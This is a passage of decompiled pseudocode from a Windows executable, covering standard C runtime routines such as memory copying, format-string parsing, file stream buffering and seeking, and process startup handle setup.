            iVar9 = 0x40;
            param_4 = param_4 + 0x400;
            do {
              param_2 = *(undefined4 *)(param_4 + -0x10);
              param_4 = param_4 + -0x10;
              iVar9 = iVar9 + -1;
            } while (iVar9 != 0);
            iVar9 = 0x80;
            do {
              uVar1 = *param_4;
              uVar2 = param_4[1];
              uVar3 = param_4[2];
              uVar4 = param_4[3];
              uVar5 = param_4[4];
              uVar6 = param_4[5];
              uVar7 = param_4[6];
              uVar8 = param_4[7];
              param_4 = param_4 + 8;
              *puVar14 = uVar1;
              puVar14[1] = uVar2;
              puVar14[2] = uVar3;
              puVar14[3] = uVar4;
              puVar14[4] = uVar5;
              puVar14[5] = uVar6;
              puVar14[6] = uVar7;
              puVar14[7] = uVar8;
              puVar14 = puVar14 + 8;
              iVar9 = iVar9 + -1;
            } while (iVar9 != 0);
          }
        }
        for (; uVar10 != 0; uVar10 = uVar10 - 1) {
          uVar1 = param_4[1];
          uVar2 = param_4[2];
          *puVar14 = *param_4;
          uVar3 = param_4[3];
          puVar14[1] = uVar1;
          uVar1 = param_4[4];
          puVar14[2] = uVar2;
          uVar2 = param_4[5];
          puVar14[3] = uVar3;
          uVar3 = param_4[6];
          puVar14[4] = uVar1;
          uVar1 = param_4[7];
          puVar14[5] = uVar2;
          puVar14[6] = uVar3;
          puVar14[7] = uVar1;
          param_4 = param_4 + 8;
          puVar14 = puVar14 + 8;
        }
      }
    }
  }
  puVar12 = param_4;
  puVar11 = param_4;
  puVar13 = puVar14;
  puVar15 = puVar14;
  switch(param_5 >> 2 & 0xf) {
  case 0xf:
    puVar13 = (undefined8 *)((int)puVar14 + 4);
    puVar12 = (undefined8 *)((int)param_4 + 4);
    *(undefined4 *)puVar14 = *(undefined4 *)param_4;
  case 0xe:
    puVar15 = (undefined8 *)((int)puVar13 + 4);
    puVar11 = (undefined8 *)((int)puVar12 + 4);
    *(undefined4 *)puVar13 = *(undefined4 *)puVar12;
  case 0xd:
    puVar14 = (undefined8 *)((int)puVar15 + 4);
    param_4 = (undefined8 *)((int)puVar11 + 4);
    *(undefined4 *)puVar15 = *(undefined4 *)puVar11;
  case 0xc:
    puVar13 = (undefined8 *)((int)puVar14 + 4);
    puVar12 = (undefined8 *)((int)param_4 + 4);
    *(undefined4 *)puVar14 = *(undefined4 *)param_4;
  case 0xb:
    puVar14 = (undefined8 *)((int)puVar13 + 4);
    param_4 = (undefined8 *)((int)puVar12 + 4);
    *(undefined4 *)puVar13 = *(undefined4 *)puVar12;
  case 10:
    puVar13 = (undefined8 *)((int)puVar14 + 4);
    puVar12 = (undefined8 *)((int)param_4 + 4);
    *(undefined4 *)puVar14 = *(undefined4 *)param_4;
  case 9:
    puVar14 = (undefined8 *)((int)puVar13 + 4);
    param_4 = (undefined8 *)((int)puVar12 + 4);
    *(undefined4 *)puVar13 = *(undefined4 *)puVar12;
  case 8:
    puVar13 = (undefined8 *)((int)puVar14 + 4);
    puVar12 = (undefined8 *)((int)param_4 + 4);
    *(undefined4 *)puVar14 = *(undefined4 *)param_4;
  case 7:
    puVar14 = (undefined8 *)((int)puVar13 + 4);
    param_4 = (undefined8 *)((int)puVar12 + 4);
    *(undefined4 *)puVar13 = *(undefined4 *)puVar12;
  case 6:
    puVar13 = (undefined8 *)((int)puVar14 + 4);
    puVar12 = (undefined8 *)((int)param_4 + 4);
    *(undefined4 *)puVar14 = *(undefined4 *)param_4;
  case 5:
    puVar14 = (undefined8 *)((int)puVar13 + 4);
    param_4 = (undefined8 *)((int)puVar12 + 4);
    *(undefined4 *)puVar13 = *(undefined4 *)puVar12;
  case 4:
    puVar13 = (undefined8 *)((int)puVar14 + 4);
    puVar12 = (undefined8 *)((int)param_4 + 4);
    *(undefined4 *)puVar14 = *(undefined4 *)param_4;
  case 3:
    puVar14 = (undefined8 *)((int)puVar13 + 4);
    param_4 = (undefined8 *)((int)puVar12 + 4);
    *(undefined4 *)puVar13 = *(undefined4 *)puVar12;
  case 2:
    puVar13 = (undefined8 *)((int)puVar14 + 4);
    puVar12 = (undefined8 *)((int)param_4 + 4);
    *(undefined4 *)puVar14 = *(undefined4 *)param_4;
  case 1:
    puVar14 = (undefined8 *)((int)puVar13 + 4);
    param_4 = (undefined8 *)((int)puVar12 + 4);
    *(undefined4 *)puVar13 = *(undefined4 *)puVar12;
  case 0:
    uVar10 = param_5 & 3;
    if (uVar10 != 0) {
      for (; uVar10 != 0; uVar10 = uVar10 - 1) {
        *(undefined *)puVar14 = *(undefined *)param_4;
        param_4 = (undefined8 *)((int)param_4 + 1);
        puVar14 = (undefined8 *)((int)puVar14 + 1);
      }
    }
    return CONCAT44(param_2,param_3);
  }
}



byte * __cdecl
FUN_00404d10(undefined *param_1,int param_2,byte *param_3,double *param_4,undefined param_5)

{
  byte bVar1;
  byte *pbVar2;
  byte *pbVar3;
  uint *puVar4;
  int iVar5;
  undefined local_88 [58];
  WCHAR local_4e;
  double local_4c;
  code *local_44;
  int local_40;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  int local_20;
  byte *local_1c;
  int local_18;
  ushort local_14;
  byte local_12;
  undefined local_11;
  uint local_c;
  undefined4 local_8;
  
  local_c = 0;
  local_8 = 0;
  local_44 = (code *)param_1;
  local_40 = param_2;
  local_1c = (byte *)0x0;
  local_11 = param_5;
  do {
    while( true ) {
      local_4e = L'\0';
      pbVar2 = FUN_00406290(&local_4e,param_3,0x7fffffff,&local_c);
      if ((int)pbVar2 < 1) {
        pbVar2 = (byte *)(uint)(*param_3 != 0);
      }
      pbVar3 = pbVar2;
      if (local_4e == L'%') {
        pbVar3 = pbVar2 + -1;
      }
      if (0 < (int)pbVar3) {
        local_40 = (*local_44)(local_40,param_3,pbVar3);
        if (local_40 == 0) {
          return (byte *)0xffffffff;
        }
        local_1c = local_1c + (int)pbVar3;
      }
      param_3 = param_3 + (int)pbVar2;
      if (local_4e == L'%') break;
      if (local_4e == L'\0') {
        return local_1c;
      }
    }
    local_24 = 0;
    local_28 = 0;
    local_2c = 0;
    local_30 = 0;
    local_34 = 0;
    local_38 = 0;
    local_14 = 0;
    while (puVar4 = FUN_00406560((uint *)" +-#0",*param_3), puVar4 != (uint *)0x0) {
      local_14 = *(ushort *)(&DAT_0040b5f6 + (int)(puVar4 + -0x102d7c) * 2) | local_14;
      param_3 = param_3 + 1;
    }
    if (*param_3 == 0x2a) {
      local_18 = *(int *)param_4;
      if (local_18 < 0) {
        local_18 = -local_18;
        local_14 = local_14 | 4;
      }
      param_3 = param_3 + 1;
      param_4 = (double *)((int)param_4 + 4);
    }
    else {
      local_18 = 0;
      while ((*(ushort *)(PTR_DAT_0040d894 + (uint)*param_3 * 2) & 1) != 0) {
        if (local_18 < 0x7fffffff) {
          local_18 = (*param_3 - 0x30) + local_18 * 10;
        }
        param_3 = param_3 + 1;
      }
    }
    if (*param_3 == 0x2e) {
      pbVar2 = param_3 + 1;
      if (*pbVar2 == 0x2a) {
        local_20 = *(int *)param_4;
        pbVar2 = param_3 + 2;
        param_4 = (double *)((int)param_4 + 4);
      }
      else {
        local_20 = 0;
        while ((*(ushort *)(PTR_DAT_0040d894 + (uint)*pbVar2 * 2) & 1) != 0) {
          if (local_20 < 0x7fffffff) {
            local_20 = (*pbVar2 - 0x30) + local_20 * 10;
          }
          pbVar2 = pbVar2 + 1;
        }
      }
    }
    else {
      local_20 = -1;
      pbVar2 = param_3;
    }
    if ((*pbVar2 == 0x68) && (pbVar2[1] == 0x68)) {
      local_12 = 0x62;
      pbVar2 = pbVar2 + 2;
    }
    else if ((*pbVar2 == 0x6c) && (pbVar2[1] == 0x6c)) {
      local_12 = 0x71;
      pbVar2 = pbVar2 + 2;
    }
    else if (((*pbVar2 == 0x49) && (pbVar2[1] == 0x36)) && (pbVar2[2] == 0x34)) {
      local_12 = 0x71;
      pbVar2 = pbVar2 + 3;
    }
    else {
      bVar1 = *pbVar2;
      if (((((bVar1 == 0x68) || (bVar1 == 0x6a)) || (bVar1 == 0x6c)) ||
          ((bVar1 == 0x74 || (bVar1 == 0x7a)))) || (bVar1 == 0x4c)) {
        local_12 = *pbVar2;
        pbVar2 = pbVar2 + 1;
      }
      else {
        local_12 = 0;
      }
    }
    param_3 = pbVar2 + 1;
    iVar5 = FUN_00406650(&local_4c,&param_4,*pbVar2,(int)local_88);
  } while ((-1 < iVar5) && (iVar5 = FUN_00406dc0((int)&local_4c,local_88), -1 < iVar5));
  return (byte *)0xffffffff;
}



uint * __cdecl FUN_00404f90(int param_1)

{
  uint *puVar1;
  int iVar2;
  
  iVar2 = 0;
  while( true ) {
    if ((&PTR_DAT_0040d478)[iVar2] == (undefined *)0x0) {
      puVar1 = FUN_00403d00(((param_1 == 0) - 1 & 0x2c) + 0x50);
      if (puVar1 == (uint *)0x0) {
        return (uint *)0x0;
      }
      (&PTR_DAT_0040d478)[iVar2] = (undefined *)puVar1;
      *puVar1 = ((param_1 == 0) - 1 & 0x20000) + 0x80;
      puVar1[0x13] = 0xffffffff;
      return puVar1;
    }
    if ((*(int *)(&PTR_DAT_0040d478)[iVar2] == 0) && (param_1 == 0)) break;
    iVar2 = iVar2 + 1;
    if (0xff < iVar2) {
      return (uint *)0x0;
    }
  }
  puVar1 = (uint *)(&PTR_DAT_0040d478)[iVar2];
  *puVar1 = 0xfffdff7f;
  return puVar1;
}



uint * __cdecl FUN_00405010(LPCSTR param_1,char *param_2,uint *param_3,uint param_4,char param_5)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  uint *puVar4;
  uint *puVar5;
  
  if (param_3 == (uint *)0x0) {
    param_3 = (uint *)0x0;
  }
  else {
    uVar2 = *param_3;
    uVar1 = param_3[0x13];
    puVar4 = &DAT_0040b604;
    puVar5 = param_3;
    for (iVar3 = 0x14; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar5 = *puVar4;
      puVar4 = puVar4 + 1;
      puVar5 = puVar5 + 1;
    }
    param_3[2] = (uint)(param_3 + 0x12);
    param_3[4] = (uint)(param_3 + 0x12);
    param_3[5] = (uint)(param_3 + 0x12);
    param_3[0xb] = (uint)(param_3 + 0x12);
    param_3[6] = (uint)(param_3 + 0x12);
    param_3[0xc] = (uint)(param_3 + 0x12);
    param_3[7] = (uint)(param_3 + 0x12);
    param_3[8] = (uint)(param_3 + 10);
    *param_3 = uVar2 & 0x20080;
    param_3[0x13] = uVar1;
    *param_3 = *param_3 | 0x10000;
    if ((param_5 != '\0') && (*param_2 == 'u')) {
      param_2 = param_2 + 1;
    }
    if (*param_2 == 'r') {
      *param_3 = *param_3 | 1;
    }
    else if (*param_2 == 'w') {
      *param_3 = *param_3 | 0x1a;
    }
    else if (*param_2 == 'a') {
      *param_3 = *param_3 | 0x16;
    }
    if ((*(byte *)param_3 & 3) == 0) {
      FUN_004042c0(param_3);
      param_3 = (uint *)0x0;
    }
    else {
      while ((param_2 = param_2 + 1, *param_2 == 'b' || (*param_2 == '+'))) {
        if (*param_2 == 'b') {
          if ((*(byte *)param_3 & 0x20) != 0) break;
          *param_3 = *param_3 | 0x20;
        }
        else {
          if ((*param_3 & 3) == 3) break;
          *param_3 = *param_3 | 3;
        }
      }
      if (param_1 == (LPCSTR)0x0) {
        if ((int)param_4 < 0) {
          FUN_004042c0(param_3);
          return (uint *)0x0;
        }
        param_3[1] = param_4;
      }
      else {
        uVar2 = FUN_00407030(param_1,*param_3);
        param_3[1] = uVar2;
        if ((int)param_3[1] < 0) {
          FUN_004042c0(param_3);
          return (uint *)0x0;
        }
      }
      FUN_004042a0();
    }
  }
  return param_3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_00405150(uint *param_1,uint *param_2,uint param_3,int param_4,DWORD param_5)

{
  uint uVar1;
  int iVar2;
  char *pcVar3;
  int iVar4;
  int iVar5;
  bool bVar6;
  undefined8 local_14;
  
  if (((*(byte *)param_1 & 3) == 0) || (iVar2 = FUN_004055c0(param_1), iVar2 != 0)) {
    _DAT_0040d334 = 0x23;
    return 0xffffffff;
  }
  if (param_2 != (uint *)0x0) {
    bVar6 = CARRY4(param_3,*param_2);
    param_3 = param_3 + *param_2;
    param_4 = param_4 + param_2[1] + (uint)bVar6;
  }
  if ((param_5 == 1) && ((*(ushort *)param_1 & 0x1000) != 0)) {
    iVar2 = FUN_004052f0((byte *)param_1,(char *)param_1[7],(char *)(param_1 + 0x12));
    if (param_1[10] == 0) {
      pcVar3 = (char *)param_1[5];
    }
    else {
      pcVar3 = (char *)param_1[10];
    }
    iVar4 = FUN_004052f0((byte *)param_1,(char *)param_1[4],pcVar3);
    iVar5 = FUN_004052f0((byte *)param_1,(char *)param_1[4],(char *)param_1[0xb]);
    iVar5 = iVar5 + iVar2 + iVar4;
    bVar6 = CARRY4(-iVar5,param_3);
    param_3 = -iVar5 + param_3;
    param_4 = (param_4 - ((iVar5 >> 0x1f) + (uint)(iVar5 != 0))) + (uint)bVar6;
  }
  if ((((param_5 == 1) && ((param_4 != 0 || (param_3 != 0)))) || (param_5 == 2)) ||
     ((param_5 == 0 && ((param_4 != -1 || (param_3 != 0xffffffff)))))) {
    if ((*param_1 & 0x20000) == 0) {
      local_14 = FUN_004070e0(param_1[1],param_3,param_4,param_5);
    }
    else {
      local_14 = (*(code *)param_1[0x14])(param_1,param_3,param_4,param_5);
    }
    param_3 = (uint)local_14;
    param_4 = local_14._4_4_;
  }
  if ((param_4 == -1) && (param_3 == 0xffffffff)) {
    _DAT_0040d334 = 0x23;
    return 0xffffffff;
  }
  if ((*(ushort *)param_1 & 0x3000) != 0) {
    param_1[4] = param_1[2];
    param_1[5] = param_1[2];
    param_1[0xb] = param_1[2];
    param_1[6] = param_1[2];
    param_1[0xc] = param_1[2];
    param_1[7] = (uint)(param_1 + 0x12);
    param_1[8] = (uint)(param_1 + 10);
    param_1[10] = 0;
  }
  if (param_2 != (uint *)0x0) {
    uVar1 = param_2[3];
    param_1[0xd] = param_2[2];
    param_1[0xe] = uVar1;
  }
  *param_1 = *param_1 & 0xffffceff;
  return 0;
}



int __cdecl FUN_004052f0(byte *param_1,char *param_2,char *param_3)

{
  int iVar1;
  
  if ((*param_1 & 0x20) == 0) {
    iVar1 = 0;
    if (param_2 < param_3) {
      do {
        if (*param_2 == '\n') {
          iVar1 = iVar1 + 1;
        }
        param_2 = param_2 + 1;
        iVar1 = iVar1 + 1;
      } while (param_2 < param_3);
    }
  }
  else if (param_2 < param_3) {
    iVar1 = (int)param_3 - (int)param_2;
  }
  else {
    iVar1 = 0;
  }
  return iVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 __cdecl FUN_00405330(uint *param_1,uint *param_2)

{
  uint uVar1;
  int iVar2;
  char *pcVar3;
  int iVar4;
  int iVar5;
  uint local_14;
  uint local_10;
  undefined8 local_c;
  
  if ((*param_1 & 0x20000) == 0) {
    local_c = FUN_004070e0(param_1[1],0,0,1);
  }
  else {
    local_c = (*(code *)param_1[0x14])(param_1,0,0,1);
  }
  local_14 = (uint)local_c;
  local_10 = local_c._4_4_;
  if (((*(byte *)param_1 & 3) == 0) ||
     ((local_c._4_4_ == 0xffffffff && ((uint)local_c == 0xffffffff)))) {
    _DAT_0040d334 = 0x23;
    local_14 = 0xffffffff;
    local_10 = 0xffffffff;
  }
  else {
    if ((*(ushort *)param_1 & 0x2000) == 0) {
      if ((*(ushort *)param_1 & 0x1000) != 0) {
        iVar2 = FUN_004052f0((byte *)param_1,(char *)param_1[7],(char *)(param_1 + 0x12));
        if (param_1[10] == 0) {
          pcVar3 = (char *)param_1[5];
        }
        else {
          pcVar3 = (char *)param_1[10];
        }
        iVar4 = FUN_004052f0((byte *)param_1,(char *)param_1[4],pcVar3);
        iVar5 = FUN_004052f0((byte *)param_1,(char *)param_1[4],(char *)param_1[0xb]);
        iVar5 = iVar5 + iVar2 + iVar4;
        local_14 = -iVar5 + (uint)local_c;
        local_10 = (local_c._4_4_ - ((iVar5 >> 0x1f) + (uint)(iVar5 != 0))) +
                   (uint)CARRY4(-iVar5,(uint)local_c);
      }
    }
    else {
      uVar1 = FUN_004052f0((byte *)param_1,(char *)param_1[2],(char *)param_1[4]);
      local_14 = (uint)local_c + uVar1;
      local_10 = local_c._4_4_ + ((int)uVar1 >> 0x1f) + (uint)CARRY4((uint)local_c,uVar1);
    }
    if (param_2 != (uint *)0x0) {
      *param_2 = local_14;
      param_2[1] = local_10;
      uVar1 = param_1[0xe];
      param_2[2] = param_1[0xd];
      param_2[3] = uVar1;
      local_14 = 0;
      local_10 = 0;
    }
  }
  return CONCAT44(local_10,local_14);
}



undefined4 __cdecl FUN_00405460(uint *param_1)

{
  undefined4 uVar1;
  uint *puVar2;
  int iVar3;
  
  if (param_1[4] < param_1[5]) {
    uVar1 = 1;
  }
  else if ((*(ushort *)param_1 & 0x100) == 0) {
    if ((*param_1 & 0xa001) == 1) {
      if (((*(ushort *)param_1 & 0xc00) == 0) && ((uint *)param_1[2] == param_1 + 0x12)) {
        puVar2 = FUN_00403d00(0x200);
        param_1[2] = (uint)puVar2;
        if (puVar2 == (uint *)0x0) {
          param_1[2] = (uint)(param_1 + 0x12);
          param_1[3] = param_1[2] + 1;
        }
        else {
          *param_1 = *param_1 | 0x40;
          param_1[3] = param_1[2] + 0x200;
          param_1[0xb] = param_1[2];
          param_1[0xc] = param_1[2];
        }
      }
      param_1[4] = param_1[2];
      param_1[5] = param_1[2];
      param_1[6] = param_1[2];
      if ((*param_1 & 0x20000) == 0) {
        iVar3 = FUN_004071b0(param_1[1],(LPCSTR)param_1[2],param_1[3] - (int)(LPCSTR)param_1[2]);
      }
      else {
        iVar3 = (*(code *)param_1[0x15])(param_1,param_1[2],param_1[3] - param_1[2]);
      }
      if (iVar3 < 0) {
        *param_1 = *param_1 | 0x4200;
        uVar1 = 0xffffffff;
      }
      else if (iVar3 == 0) {
        *param_1 = *param_1 & 0xffffefff | 0x4100;
        uVar1 = 0;
      }
      else {
        *param_1 = *param_1 | 0x5000;
        param_1[5] = iVar3 + param_1[5];
        uVar1 = 1;
      }
    }
    else {
      *param_1 = *param_1 | (((*param_1 & 0x8000) != 0) - 1 & 0x4000) + 0x200;
      uVar1 = 0xffffffff;
    }
  }
  else {
    uVar1 = 0;
  }
  return uVar1;
}



void __cdecl FUN_00405590(undefined4 param_1)

{
  int iVar1;
  
  if (DAT_0040d25c <= DAT_0040d260) {
    FUN_004074c0();
  }
  iVar1 = DAT_0040d260 * 4;
  DAT_0040d260 = DAT_0040d260 + 1;
  *(undefined4 *)(&DAT_0040d11c + iVar1) = param_1;
  return;
}



undefined4 __cdecl FUN_004055c0(uint *param_1)

{
  int iVar1;
  undefined4 uVar2;
  char *pcVar3;
  uint uVar4;
  int iVar5;
  
  if (param_1 == (uint *)0x0) {
    uVar2 = 0;
    iVar5 = 0;
    do {
      if (((uint *)(&PTR_DAT_0040d478)[iVar5] != (uint *)0x0) &&
         (iVar1 = FUN_004055c0((uint *)(&PTR_DAT_0040d478)[iVar5]), iVar1 < 0)) {
        uVar2 = 0xffffffff;
      }
      iVar5 = iVar5 + 1;
    } while (iVar5 < 0x100);
  }
  else if ((*(ushort *)param_1 & 0x2000) == 0) {
    uVar2 = 0;
  }
  else {
    for (pcVar3 = (char *)param_1[2]; pcVar3 < (char *)param_1[4]; pcVar3 = pcVar3 + iVar5) {
      if ((*param_1 & 0x20000) == 0) {
        iVar5 = FUN_004074e0(param_1[1],pcVar3,param_1[4] - (int)pcVar3);
      }
      else {
        iVar5 = (*(code *)param_1[0x16])(param_1,pcVar3,param_1[4] - (int)pcVar3);
      }
      if (iVar5 < 1) {
        param_1[4] = param_1[2];
        param_1[6] = param_1[2];
        param_1[0xc] = param_1[2];
        *param_1 = *param_1 | 0x200;
        return 0xffffffff;
      }
    }
    param_1[4] = param_1[2];
    if ((*(ushort *)param_1 & 0xc00) == 0) {
      uVar4 = param_1[3];
    }
    else {
      uVar4 = param_1[2];
    }
    if ((*(ushort *)param_1 & 0x4000) == 0) {
      param_1[0xc] = uVar4;
    }
    else {
      param_1[6] = uVar4;
    }
    uVar2 = 0;
  }
  return uVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_00405690(uint param_1)

{
  int iVar1;
  int iVar2;
  HANDLE hObject;
  BOOL BVar3;
  undefined4 uVar4;
  DWORD DVar5;
  
  if ((DAT_0040e300 <= param_1) ||
     ((*(byte *)((&DAT_0040e304)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 1) == 0)) {
    _DAT_0040d334 = 9;
    return 0xffffffff;
  }
  iVar1 = FUN_00407980(param_1);
  if (iVar1 != -1) {
    if ((param_1 == 1) || (param_1 == 2)) {
      iVar1 = FUN_00407980(1);
      iVar2 = FUN_00407980(2);
      if (iVar1 == iVar2) goto LAB_00405704;
    }
    hObject = (HANDLE)FUN_00407980(param_1);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar5 = GetLastError();
      goto LAB_00405710;
    }
  }
LAB_00405704:
  DVar5 = 0;
LAB_00405710:
  FUN_00407850(param_1);
  *(undefined *)((&DAT_0040e304)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) = 0;
  if (DVar5 == 0) {
    uVar4 = 0;
  }
  else {
    FUN_00407aa0(DVar5);
    uVar4 = 0xffffffff;
  }
  return uVar4;
}



void __cdecl FUN_00405750(LPCSTR param_1)

{
  FUN_00407c40(param_1);
  return;
}



undefined4 __cdecl FUN_00405760(uint *param_1)

{
  undefined4 uVar1;
  int iVar2;
  uint *puVar3;
  
  if (param_1[4] < param_1[6]) {
    uVar1 = 0;
  }
  else if ((*param_1 & 0x9002) == 2) {
    if ((((*param_1 & 0x6000) == 0x6000) && (param_1[3] <= param_1[4])) &&
       (iVar2 = FUN_004055c0(param_1), iVar2 != 0)) {
      return 0xffffffff;
    }
    if (((*(ushort *)param_1 & 0xc00) == 0) && ((uint *)param_1[2] == param_1 + 0x12)) {
      puVar3 = FUN_00403d00(0x200);
      param_1[2] = (uint)puVar3;
      if (puVar3 == (uint *)0x0) {
        param_1[2] = (uint)(param_1 + 0x12);
        param_1[4] = param_1[2];
        param_1[3] = param_1[2] + 1;
        FUN_004042a0();
      }
      else {
        *param_1 = *param_1 | 0x40;
        param_1[4] = param_1[2];
        param_1[3] = param_1[2] + 0x200;
        param_1[0xb] = param_1[2];
        param_1[0xc] = param_1[2];
        FUN_004042a0();
      }
    }
    param_1[5] = param_1[2];
    param_1[6] = param_1[3];
    *param_1 = *param_1 | 0x6000;
    uVar1 = 0;
  }
  else {
    *param_1 = *param_1 | (((*param_1 & 0x8000) != 0) - 1 & 0x4000) + 0x200;
    uVar1 = 0xffffffff;
  }
  return uVar1;
}



uint * __cdecl FUN_00405850(uint *param_1,uint param_2,uint *param_3)

{
  uint uVar1;
  uint *puVar2;
  uint *puVar3;
  char cVar4;
  
  if (param_3 != (uint *)0x0) {
    if ((uint *)0x7 < param_3) {
      uVar1 = (uint)param_1 & 3;
      while (uVar1 != 0) {
        cVar4 = *(char *)param_1;
        param_1 = (uint *)((int)param_1 + 1);
        if (cVar4 == (char)param_2) goto LAB_00405906;
        param_3 = (uint *)((int)param_3 - 1);
        if (param_3 == (uint *)0x0) {
          return (uint *)0x0;
        }
        uVar1 = (uint)param_1 & 3;
      }
      param_2 = (param_2 & 0xff) * 0x1010101;
      do {
        do {
          puVar3 = param_1;
          puVar2 = param_3 + -1;
          param_1 = puVar3;
          if (param_3 < (uint *)0x4) goto joined_r0x004058ee;
          param_1 = puVar3 + 1;
          param_3 = puVar2;
        } while (((*puVar3 ^ param_2 ^ 0xffffffff ^ (*puVar3 ^ param_2) + 0x7efefeff) & 0x81010100)
                 == 0);
        uVar1 = *puVar3;
        cVar4 = (char)param_2;
        if ((char)uVar1 == cVar4) {
          return puVar3;
        }
        if ((char)(uVar1 >> 8) == cVar4) {
          return (uint *)((int)puVar3 + 1);
        }
        if ((char)(uVar1 >> 0x10) == cVar4) {
          return (uint *)((int)puVar3 + 2);
        }
      } while ((char)(uVar1 >> 0x18) != cVar4);
LAB_00405906:
      return (uint *)((int)param_1 + -1);
    }
    do {
      cVar4 = *(char *)param_1;
      param_1 = (uint *)((int)param_1 + 1);
      if (cVar4 == (char)param_2) goto LAB_00405906;
      param_3 = (uint *)((int)param_3 - 1);
joined_r0x004058ee:
    } while (param_3 != (uint *)0x0);
  }
  return param_3;
}



void __cdecl FUN_00405930(UINT param_1)

{
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void __cdecl FUN_00405a90(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x405aac,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



void __cdecl FUN_00405af0(int param_1,uint param_2)

{
  int iVar1;
  uint uVar2;
  void *pvStack_1c;
  undefined *puStack_18;
  undefined4 local_14;
  int iStack_10;
  
  iStack_10 = param_1;
  puStack_18 = &LAB_00405ac0;
  pvStack_1c = ExceptionList;
  ExceptionList = &pvStack_1c;
  while( true ) {
    iVar1 = *(int *)(param_1 + 8);
    uVar2 = *(uint *)(param_1 + 0xc);
    if ((uVar2 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar2 <= param_2)))) break;
    local_14 = *(undefined4 *)(iVar1 + uVar2 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_14;
    if (*(int *)(iVar1 + 4 + uVar2 * 0xc) == 0) {
      FUN_00405bb9(0x101);
      (**(code **)(iVar1 + 8 + uVar2 * 0xc))();
    }
  }
  ExceptionList = pvStack_1c;
  return;
}



void FUN_00405bb9(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_0040d884 = param_1;
  DAT_0040d880 = in_EAX;
  DAT_0040d888 = unaff_EBP;
  return;
}



// WARNING: Removing unreachable block (ram,0x00405c02)
// WARNING: Removing unreachable block (ram,0x00405bf6)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00405be0(void)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  byte in_CF;
  byte in_PF;
  byte in_AF;
  byte in_ZF;
  byte in_SF;
  byte in_TF;
  byte in_IF;
  byte in_OF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  uint uVar4;
  
  uVar4 = (uint)(in_NT & 1) * 0x4000 | (uint)(in_OF & 1) * 0x800 | (uint)(in_IF & 1) * 0x200 |
          (uint)(in_TF & 1) * 0x100 | (uint)(in_SF & 1) * 0x80 | (uint)(in_ZF & 1) * 0x40 |
          (uint)(in_AF & 1) * 0x10 | (uint)(in_PF & 1) * 4 | (uint)(in_CF & 1) |
          (uint)(in_ID & 1) * 0x200000 | (uint)(in_VIP & 1) * 0x100000 |
          (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  uVar3 = uVar4 ^ 0x200000;
  if ((((uint)((uVar3 & 0x4000) != 0) * 0x4000 | (uint)((uVar3 & 0x800) != 0) * 0x800 |
        (uint)((uVar3 & 0x400) != 0) * 0x400 | (uint)((uVar3 & 0x200) != 0) * 0x200 |
        (uint)((uVar3 & 0x100) != 0) * 0x100 | (uint)((uVar3 & 0x80) != 0) * 0x80 |
        (uint)((uVar3 & 0x40) != 0) * 0x40 | (uint)((uVar3 & 0x10) != 0) * 0x10 |
        (uint)((uVar3 & 4) != 0) * 4 | (uint)((uVar3 & 1) != 0) |
        (uint)((uVar3 & 0x200000) != 0) * 0x200000 | (uint)((uVar3 & 0x40000) != 0) * 0x40000) !=
       uVar4) && (piVar1 = (int *)cpuid_basic_info(0), 0 < *piVar1)) {
    iVar2 = cpuid_Version_info(1);
    uVar3 = *(uint *)(iVar2 + 8);
    _DAT_0040d88c = (uint)((uVar3 & 0x800000) != 0);
    if ((uVar3 & 0x1000000) != 0) {
      _DAT_0040d88c = _DAT_0040d88c | 0x10;
    }
    if ((uVar3 & 0x2000000) != 0) {
      _DAT_0040d88c = _DAT_0040d88c | 2;
    }
    if ((uVar3 & 0x4000000) != 0) {
      _DAT_0040d88c = _DAT_0040d88c | 4;
    }
    if ((*(uint *)(iVar2 + 0xc) & 1) != 0) {
      _DAT_0040d88c = _DAT_0040d88c | 8;
    }
  }
  return;
}



void FUN_00405c50(void)

{
  GetSystemTimeAsFileTime((LPFILETIME)&DAT_0040e210);
  return;
}



void FUN_00405ca0(void)

{
  HANDLE *ppvVar1;
  uint *puVar2;
  DWORD DVar3;
  HANDLE hFile;
  HANDLE hSourceProcessHandle;
  HANDLE hTargetProcessHandle;
  BOOL BVar4;
  UINT UVar5;
  UINT UVar6;
  int iVar7;
  uint uVar8;
  UINT *local_54;
  HANDLE *local_50;
  HANDLE local_4c;
  _STARTUPINFOA local_48;
  
  puVar2 = FUN_00403d00(0x100);
  if (puVar2 == (uint *)0x0) {
    FUN_00405930(1);
  }
  DAT_0040e300 = 0x20;
  DAT_0040e304 = puVar2;
  for (; puVar2 < DAT_0040e304 + 0x40; puVar2 = puVar2 + 2) {
    *(undefined *)(puVar2 + 1) = 0;
    *puVar2 = 0xffffffff;
    *(undefined *)((int)puVar2 + 5) = 10;
  }
  GetStartupInfoA(&local_48);
  if ((local_48.cbReserved2 != 0) && ((UINT *)local_48.lpReserved2 != (UINT *)0x0)) {
    UVar5 = *(UINT *)local_48.lpReserved2;
    local_54 = (UINT *)((int)local_48.lpReserved2 + 4);
    local_50 = (HANDLE *)(UVar5 + (int)local_54);
    if (0x800 < (int)UVar5) {
      UVar5 = 0x800;
    }
    iVar7 = 1;
    while ((UVar6 = UVar5, (int)DAT_0040e300 < (int)UVar5 &&
